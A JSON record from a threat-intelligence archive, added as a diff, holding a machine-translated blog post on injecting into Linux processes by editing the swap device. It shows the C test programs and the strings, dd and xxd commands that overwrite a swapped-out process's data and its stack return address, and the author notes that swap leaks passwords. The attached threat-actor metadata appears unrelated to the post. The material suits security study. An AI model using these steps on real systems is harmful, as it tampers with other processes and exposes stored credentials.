@@ -1,0 +1,84 @@
+{
+    "id": "4adda0e8-56c7-4277-a93e-9724c41673d0",
+    "created_at": "2023-01-12T15:05:08.49258Z",
+    "updated_at": "2025-03-27T02:16:26.276473Z",
+    "deleted_at": null,
+    "sha1_hash": "05b3b8ff5a851260552c3b00c18273b7dcbf8843",
+    "title": "Modifying swap space of Linux to realize process",
+    "authors": "",
+    "file_creation_date": "2021-03-08T01:14:35Z",
+    "file_modification_date": "2021-03-08T01:14:35Z",
+    "file_size": 218870,
+    "plain_text": "# Modifying swap space of Linux to realize process injection\n\n**javamana.com/2020/11/20201113003353110i.html**\n\ndog250 2020-11-12 22:57:28\nmodifying swap space linux realize process injection\n\nTwo consecutive nights of heavy rain, comfortable, Come home from work and continue\njuggling .\n\nI juggled last night /proc/$pid/mem, Wrote an article about process code injection ：\n\n[https://blog.csdn.net/dog250/article/details/108618568](https://blog.csdn.net/dog250/article/details/108618568)\n\nThis method just uses the kernel to export to procfs One of them mem file, Fortunately, it\nwas written ！ This is not a general approach, As for the ptrace,stap such, It is more\nembodied as a tool, Not craft .\n\nswap Enough space for general use, Every system has, It's an important part of the\ninfrastructure of modern operating systems, This article takes swap Space fun .\n\nLast weekend, I strings Let's talk about a virtual machine swap Space, Frightening, What\nhas, My various account passwords, Many of the websites you have logged in can be found\nin swap It's found in the space, So I shut it down swap.\n\nswap Space is a leaky bucket ！ A public clothes hanger .\n\ntherefore, We can use swap Space play process hack.\n\n**_by the way, Don't think about encryption swap Space, this kind of thing, is a matter of_**\n**_defying one's advice,swap It's slow, You have another encryption and decryption, Slow up_**\n**_and slow down, In order to get a flat address space, There's no point in doing this, Add a_**\n**_memory module ._**\n\n**_However, It's not OK to add memory dump The whole memory ？ such as_**\n**_/dev/mem,/proc/$pid/mem such … even so, Is better than swap Be safe .hack swap It's so_**\n**_easy ！_**\n\nFirst, I want to cover swap In order to modify the private data in the process .\n\nLook at the code first ：\n\n\n-----\n\n```\n#include <stdio.h>\n#include <sys/mman.h>\n#include <string.h>\n#define MADV_SOFT_OFFLINE 101\nint main(int argc, const char **argv)\n{\nvoid *map[65536];\nchar buf[256];\nint i = 0, which;\n// Loop memory allocation and write memory, The goal is to trigger swap to disk\noperation .\nwhile (i < 65535) {\n // 65535 Maybe it's a little small, For the purpose of the experiment, I\npurposely reduced the virtual machine memory to 64M, To trigger memory more easily\nswap.\nmap[i] = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE, -1, 0);\nif (map[i] == NULL)\nbreak;\n// I can't help but see that these strings are copied into buffer\nsnprintf(buf, 256, \"E%d:ZheJiang Wenzhou skinshoe wet,down rain enter water not can\nfat\", i);\nstrcpy(map[i], buf);\ni ++;\n}\nprintf(\"map:%d\\n\", i);\nscanf(\"%d\", &which);\nprintf(\"map after:%s\\n\", map[which]);\nreturn 0;\n}\n\n```\nThe following steps are in one go ：\n\nstay swap Space search feature string position .\nWill replace the string dd To swap The corresponding position of space .\n\nPlease have a look at ：\n\n\n-----\n\n```\n# stay swap Spatial search feature string position offset \n# Be careful, I use 1234 Do the index, I'll export the process later map The first\nof an array of 1234 Elements, To see if it has been modified .\n[root@localhost test]# strings -a -t x /dev/dm-1 |grep E1234:ZheJiang\n391f000 E1234:ZheJiang Wenzhou skinshoe wet,down rain enter water not can fat\n[root@localhost test]#\n# Show me the replacement string and its size \n[root@localhost test]# ll ./new\n-rw-r--r-- 1 root root 70 9 month 17 17:32 ./new\n[root@localhost test]# cat new\nDDDDD:Zhejiang Wenzhou pixie shi,xia yu jin shui bu hui pang\n[root@localhost test]#\n# The above offset 0x391f000 Decimal system of 59895808, Cover with a replacement\nstring swap The character string of space \n[root@localhost test]# dd if=./new of=/dev/dm-1 obs=1 bs=1 seek=59895808 count=70 \nRecorded 70+0 Read in of\nRecorded 70+0 Write\n70 byte (70 B) Copied,0.00130832 second,53.5 kB/ second\n\n```\nHere, please pay attention to, This article only uses the characteristic string as an example,\nIn practice, Any binary can be used to match, Here's the string, Mainly because strings\nCommand is more convenient, You can also use regular, And if it's any binary match, That\nrequires other binary pattern matching techniques .\n\nNext, I am here mmap Terminal input for program running 1234 As index, Look at the\nsituation ：\n```\n1234 # This is the input, According to the characteristic string E1234:ZheJiang,\nNeed to enter 1234 Index \nmap after:DDDDD:Zhejiang Wenzhou pixie shi,xia yu jin shui bu hui pang\n[root@localhost test]#\n\n```\nSuccessfully replaced ！ Not used this time stap, Didn't write /proc/$pid/mem, I just wrote\nswap nothing more .\n\nNow that you can replace the data, that stack Space as part of the data, It can also be swap\nout Of, If you can write swap To operate stack, Can't it be done like ROP The operation of,\nAny replacement return address .\n\nNext, Let's try .\n\nLook at another code ：\n\n\n-----\n\n```\n#include <stdio.h>\n#include <stdlib.h>\nvoid func()\n{\nchar v[] = \"555555555555555555555555\";\ngetchar();\nprintf(\"after getchar\\n\");\n}\nint main(int argc, char **argv)\n{\nfunc();\nprintf(\"end\\n\");\nreturn 0;\n}\n\n```\nIt's simple, Let's run it once ：\n```\n[root@localhost test]# ./a.out\nA\nafter getchar\nend\n[root@localhost test]# \n\n```\nEnter a character, Print two lines of tips, That's it .\n\nMy goal is through manipulation swap Space, Let the program no longer print “after\ngetchar” this sentence, Bypass printf, Directly from fun return, Can it be done ？ Certainly.\n！\n\nFirst run it, But don't type in ：\n```\n[root@localhost test]# ./a.out\n... # Waiting for input \n\n```\nadopt objdump to glance at getchar Original return address location ：\n```\n400593: e8 b8 fe ff ff callq 400450 <getchar@plt>\n400598: bf 60 06 40 00 mov $0x400660,%edi\n40059d: e8 8e fe ff ff callq 400430 <puts@plt>\n4005a2: c9 leaveq\n\n```\nUm., Namely 0x400598 了 . I want to modify swap Space, Then change the return address\nto 0x4005a2, Thus skip over printf, That is to say objdump Medium puts.\n\nThe next step is to find swap In the space a.out programmatic stack The location of .\n\nBy operating swap Space to modify the process of stack, We have to find a way to make it\nstack Be swapped out, To make this o.out Of stack Be swapped out, I use the one at the\nbeginning of this article mmap process, Try to allocate memory, So the inactive process\nwaiting for input a out Of stack Of course the memory will be replaced\n\n\n-----\n\nConfirm it ：\n```\n[root@localhost test]# ps -e|grep a.out\n3230 pts/2 00:00:01 a.out\n[root@localhost test]# cat /proc/3230/smaps |grep -A15 stack|grep Swap\nSwap: 16 kB\n\n```\nNext, look for the characteristic string \"555555555555555555555555\", Try to find... Near it\ngetchar Return address of 0x400598：\n```\n[root@localhost test]# strings -a -t x /dev/dm-1 |grep 555555555555555555555555\n2e5e09a 555555555555555555555555 # 2e5e09a It is determined to be 48619550, It can\nalso be other values nearby .\n[root@localhost test]# dd of=./stack if=/dev/dm-1 obs=1 bs=1 skip=48619550\ncount=4096\n\n```\nadopt \"vi -b ./stack\" Of \":%!xxd\" To edit binary stack file, Found the location below ：\n```\n...\n00000050: 647f 0000 0000 0000 0000 0000 9805 4000 d.............@.\n00000060: 0000 0000 3535 3535 3535 3535 3535 3535 ....555555555555\n00000070: 3535 3535 3535 3535 3535 3535 0000 0000 555555555555....\n...\n\n```\ntake “9805 4000” Change to “a205 4000” that will do ：\n```\n00000050: 647f 0000 0000 0000 0000 0000 a205 4000 d.............@.\n\n```\nuse \"%!xxd -r\" After saving, And then again dd Go back ：\n```\n[root@localhost test]# dd if=./stack of=/dev/dm-1 obs=1 bs=1 seek=48619550\ncount=4096\n\n```\nRunning a.out The terminal type in the character \"A\"：\n```\n[root@localhost test]# ./a.out\nA\nend\n[root@localhost test]#\n\n```\nSuccessfully bypassed printf！\n\nIt's easy to do this kind of attack, Just trigger the system to switch the memory to the swap\nspace, All you have to do is allocate memory, Then let the system squeeze the memory of\nthe attacked program to Public visible exchange space in, then …\n\n**_Have to say, If a process is stack It's been replaced, So if you can find this_**\n**_stack stay swap The location of space, You can be in stack It's piled up with_**\n**_arbitrary data, Offline construct a satisfying ReturnToLibc Of ROP Isn't that_**\n**_hard, Mainly hand speed, Be quick ！_**\n\n\n-----\n\nHow to put it? ？ Modern operating systems swap Is space still necessary ？\n\nModern operating system as a virtual storage based operating system, In principle, the\ndifference between memory media is shielded, The purpose is to provide a flat address\nspace for the process, There's no problem with that . But in practice, I don't think this\nmechanism is needed anymore .swap More value for small memory systems, And the\nmemory of contemporary system is often dozens of G, If enabled swap, Security can't be\nguaranteed. Don't say, Frequent swapping in and out will also lead to the process running\ndelay jitter, There's no need .\n\nTurn off the swap Well .\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Linux/Process Injection/Modifying swap space of Linux to realize process.pdf"
+    ],
+    "report_names": [
+        "Modifying swap space of Linux to realize process.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
+            "created_at": "2022-10-25T16:07:24.139848Z",
+            "updated_at": "2025-03-27T02:02:10.120505Z",
+            "deleted_at": null,
+            "main_name": "Safe",
+            "aliases": [],
+            "source_name": "ETDA:Safe",
+            "tools": [
+                "DebugView",
+                "LZ77",
+                "OpenDoc",
+                "SafeDisk",
+                "TypeConfig",
+                "UPXShell",
+                "UsbDoc",
+                "UsbExe"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
+            "created_at": "2024-11-01T02:00:52.756877Z",
+            "updated_at": "2025-03-27T02:00:55.544216Z",
+            "deleted_at": null,
+            "main_name": "Play",
+            "aliases": null,
+            "source_name": "MITRE:Play",
+            "tools": [
+                "Nltest",
+                "AdFind",
+                "PsExec",
+                "Wevtutil",
+                "Cobalt Strike",
+                "Playcrypt",
+                "Mimikatz"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673535908,
+    "ts_updated_at": 1743041786,
+    "ts_creation_date": 1615166075,
+    "ts_modification_date": 1615166075,
+    "files": {
+        "pdf": "https://archive.orkl.eu/05b3b8ff5a851260552c3b00c18273b7dcbf8843.pdf",
+        "text": "https://archive.orkl.eu/05b3b8ff5a851260552c3b00c18273b7dcbf8843.txt",
+        "img": "https://archive.orkl.eu/05b3b8ff5a851260552c3b00c18273b7dcbf8843.jpg"
+    }
+}
